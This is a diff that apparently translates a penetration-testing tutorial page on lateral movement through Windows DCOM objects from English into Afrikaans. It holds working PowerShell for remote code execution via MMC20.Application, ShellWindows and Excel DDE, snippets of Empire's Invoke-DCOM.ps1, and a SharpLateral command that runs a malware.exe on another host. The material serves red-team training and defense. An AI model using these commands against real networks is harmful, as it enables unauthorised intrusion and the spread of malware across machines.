@@ -4,33 +4,26 @@
 
 ## MMC20.Application
 
-**For more info about this technique chech the original post from [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**
+**Vir meer inligting oor hierdie tegniek, kyk na die oorspronklike pos van [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**
 
-Distributed Component Object Model (DCOM) objects present an interesting capability for network-based interactions with objects. Microsoft provides comprehensive documentation for both DCOM and Component Object Model (COM), accessible [here for DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) and [here for COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). A list of DCOM applications can be retrieved using the PowerShell command:
-
+Distributed Component Object Model (DCOM) objekke bied 'n interessante vermoë vir netwerk-gebaseerde interaksies met objekke. Microsoft bied omvattende dokumentasie vir beide DCOM en Component Object Model (COM), beskikbaar [hier vir DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) en [hier vir COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). 'n Lys van DCOM toepassings kan verkry word met die PowerShell opdrag:
 ```bash
 Get-CimInstance Win32_DCOMApplication
 ```
+Die COM objek, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), stel die skripting van MMC snap-in operasies in staat. Opmerklik, hierdie objek bevat 'n `ExecuteShellCommand` metode onder `Document.ActiveView`. Meer inligting oor hierdie metode kan [hier](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>) gevind word. Kontroleer dit wat dit uitvoer:
 
-The COM object, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), enables scripting of MMC snap-in operations. Notably, this object contains a `ExecuteShellCommand` method under `Document.ActiveView`. More information about this method can be found [here](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Check it running:
-
-This feature facilitates the execution of commands over a network through a DCOM application. To interact with DCOM remotely as an admin, PowerShell can be utilized as follows:
-
+Hierdie funksie fasiliteer die uitvoering van opdragte oor 'n netwerk deur 'n DCOM toepassing. Om met DCOM op afstand as 'n admin te kommunikeer, kan PowerShell soos volg gebruik word:
 ```powershell
 [activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
 ```
+Hierdie opdrag maak verbinding met die DCOM-toepassing en keer 'n instansie van die COM-objek terug. Die ExecuteShellCommand-metode kan dan aangeroep word om 'n proses op die afstandsbediener uit te voer. Die proses behels die volgende stappe:
 
-This command connects to the DCOM application and returns an instance of the COM object. The ExecuteShellCommand method can then be invoked to execute a process on the remote host. The process involves the following steps:
-
-Check methods:
-
+Kontroleer metodes:
 ```powershell
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
 $com.Document.ActiveView | Get-Member
 ```
-
-Get RCE:
-
+Kry RCE:
 ```powershell
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
 $com | Get-Member
@@ -39,82 +32,72 @@ $com | Get-Member
 
 ls \\10.10.10.10\c$\Users
 ```
-
 ## ShellWindows & ShellBrowserWindow
 
-**For more info about this technique check the original post [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**
+**Vir meer inligting oor hierdie tegniek, kyk na die oorspronklike pos [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**
 
-The **MMC20.Application** object was identified to lack explicit "LaunchPermissions," defaulting to permissions that permit Administrators access. For further details, a thread can be explored [here](https://twitter.com/tiraniddo/status/817532039771525120), and the usage of [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET for filtering objects without explicit Launch Permission is recommended.
+Die **MMC20.Application** objek is geïdentifiseer as wat nie eksplisiete "LaunchPermissions" het nie, wat standaard na toestemmings wat Administrators toegang gee, terugval. Vir verdere besonderhede kan 'n draad ondersoek word [hier](https://twitter.com/tiraniddo/status/817532039771525120), en die gebruik van [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET vir die filtrering van objekte sonder eksplisiete Launch Permission word aanbeveel.
 
-Two specific objects, `ShellBrowserWindow` and `ShellWindows`, were highlighted due to their lack of explicit Launch Permissions. The absence of a `LaunchPermission` registry entry under `HKCR:\AppID\{guid}` signifies no explicit permissions.
+Twee spesifieke objekte, `ShellBrowserWindow` en `ShellWindows`, is beklemtoon weens hul gebrek aan eksplisiete Launch Permissions. Die afwesigheid van 'n `LaunchPermission` registrasie-invoer onder `HKCR:\AppID\{guid}` dui op geen eksplisiete toestemmings nie.
 
 ### ShellWindows
 
-For `ShellWindows`, which lacks a ProgID, the .NET methods `Type.GetTypeFromCLSID` and `Activator.CreateInstance` facilitate object instantiation using its AppID. This process leverages OleView .NET to retrieve the CLSID for `ShellWindows`. Once instantiated, interaction is possible through the `WindowsShell.Item` method, leading to method invocation like `Document.Application.ShellExecute`.
+Vir `ShellWindows`, wat 'n ProgID ontbreek, fasiliteer die .NET metodes `Type.GetTypeFromCLSID` en `Activator.CreateInstance` objekinstansie met behulp van sy AppID. Hierdie proses benut OleView .NET om die CLSID vir `ShellWindows` te verkry. Sodra dit geïnstantieer is, is interaksie moontlik deur die `WindowsShell.Item` metode, wat lei tot metode-aanroep soos `Document.Application.ShellExecute`.
 
-Example PowerShell commands were provided to instantiate the object and execute commands remotely:
-
+Voorbeeld PowerShell-opdragte is verskaf om die objek te instansieer en opdragte op afstand uit te voer:
 ```powershell
 $com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
 $obj = [System.Activator]::CreateInstance($com)
 $item = $obj.Item()
 $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
 ```
+### Laterale Beweging met Excel DCOM-objekte
 
-### Lateral Movement with Excel DCOM Objects
+Laterale beweging kan bereik word deur DCOM Excel-objekte te benut. Vir gedetailleerde inligting, is dit raadsaam om die bespreking oor die benutting van Excel DDE vir laterale beweging via DCOM op [Cybereason se blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) te lees.
 
-Lateral movement can be achieved by exploiting DCOM Excel objects. For detailed information, it's advisable to read the discussion on leveraging Excel DDE for lateral movement via DCOM at [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).
-
-The Empire project provides a PowerShell script, which demonstrates the utilization of Excel for remote code execution (RCE) by manipulating DCOM objects. Below are snippets from the script available on [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), showcasing different methods to abuse Excel for RCE:
-
+Die Empire-projek bied 'n PowerShell-skrip, wat die gebruik van Excel vir afstandkode-uitvoering (RCE) demonstreer deur DCOM-objekte te manipuleer. Hieronder is snitte van die skrip beskikbaar op [Empire se GitHub-bewaarplek](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), wat verskillende metodes toon om Excel vir RCE te misbruik:
 ```powershell
 # Detection of Office version
 elseif ($Method -Match "DetectOffice") {
-    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
-    $Obj = [System.Activator]::CreateInstance($Com)
-    $isx64 = [boolean]$obj.Application.ProductCode[21]
-    Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
+$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
+$Obj = [System.Activator]::CreateInstance($Com)
+$isx64 = [boolean]$obj.Application.ProductCode[21]
+Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
 }
 # Registration of an XLL
 elseif ($Method -Match "RegisterXLL") {
-    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
-    $Obj = [System.Activator]::CreateInstance($Com)
-    $obj.Application.RegisterXLL("$DllPath")
+$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
+$Obj = [System.Activator]::CreateInstance($Com)
+$obj.Application.RegisterXLL("$DllPath")
 }
 # Execution of a command via Excel DDE
 elseif ($Method -Match "ExcelDDE") {
-    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
-    $Obj = [System.Activator]::CreateInstance($Com)
-    $Obj.DisplayAlerts = $false
-    $Obj.DDEInitiate("cmd", "/c $Command")
+$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
+$Obj = [System.Activator]::CreateInstance($Com)
+$Obj.DisplayAlerts = $false
+$Obj.DDEInitiate("cmd", "/c $Command")
 }
 ```
+### Outomatiseringstoestelle vir Laterale Beweging
 
-### Automation Tools for Lateral Movement
+Twee toestelle word beklemtoon vir die outomatisering van hierdie tegnieke:
 
-Two tools are highlighted for automating these techniques:
+- **Invoke-DCOM.ps1**: 'n PowerShell-skrip wat deur die Empire-projek verskaf word en die oproep van verskillende metodes vir die uitvoering van kode op afstandmasjiene vereenvoudig. Hierdie skrip is beskikbaar by die Empire GitHub-bewaarplek.
 
-- **Invoke-DCOM.ps1**: A PowerShell script provided by the Empire project that simplifies the invocation of different methods for executing code on remote machines. This script is accessible at the Empire GitHub repository.
-
-- **SharpLateral**: A tool designed for executing code remotely, which can be used with the command:
-
+- **SharpLateral**: 'n Toestel wat ontwerp is om kode op afstand uit te voer, wat gebruik kan word met die opdrag:
 ```bash
 SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 ```
+## Outomatiese Gereedskap
 
-## Automatic Tools
-
-- The Powershell script [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) allows to easily invoke all the commented ways to execute code in other machines.
-- You could also use [**SharpLateral**](https://github.com/mertdas/SharpLateral):
-
+- Die Powershell-skrip [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) maak dit maklik om al die kommentaar maniere om kode op ander masjiene uit te voer, aan te roep.
+- Jy kan ook [**SharpLateral**](https://github.com/mertdas/SharpLateral) gebruik:
 ```bash
 SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 ```
-
-## References
+## Verwysings
 
 - [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
 - [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
 
 {{#include ../../banners/hacktricks-training.md}}
-
